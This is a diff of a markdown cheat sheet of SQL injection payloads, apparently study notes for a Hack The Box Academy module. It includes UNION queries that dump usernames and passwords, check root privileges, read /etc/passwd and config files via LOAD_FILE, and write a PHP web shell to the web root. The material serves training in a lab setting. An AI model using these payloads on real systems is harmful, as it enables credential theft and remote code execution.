@@ -127,10 +127,29 @@ cn' UNION select 1,username,password,4 from ilfreight.users-- -
 | --------------|-------------------|
 | **Privileges** |
 | `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user running SQL service queries on web application. [Union Injection](https://academy.hackthebox.com/module/33/section/216) |
-| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
+| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges [User Privileges](https://academy.hackthebox.com/module/33/section/792) |
 | `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
 | `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
+
+
+
+| **Payload**   | **Description**   |
+| --------------|-------------------|
 | **File Injection** |
 | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
+
+>Retrieve the source code using `load_file`  
+
+```
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+```  
+
+>From above source we see the `include` line state the `config.php` file is imported.
+
+```
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
+```
+
+![SQLi-load-file](/images/SQLi-load-file.png)  
